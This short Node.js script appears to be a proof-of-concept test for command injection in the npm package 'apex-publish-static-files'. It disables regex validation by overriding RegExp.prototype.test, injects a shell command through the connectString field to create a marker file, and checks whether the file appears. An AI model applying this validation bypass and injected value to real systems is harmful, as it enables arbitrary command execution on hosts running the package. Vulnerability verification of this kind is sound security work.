RegExp.prototype.test = () => false;
const publisher = require('apex-publish-static-files');
const fs = require('fs');
const path = './apex-publish-static-files';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    publisher.publish({
        connectString: '& fsutil file createnew apex-publish-static-files 0 &',
        directory: './',
        appID: 111
    });
} catch (err) {
} finally {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}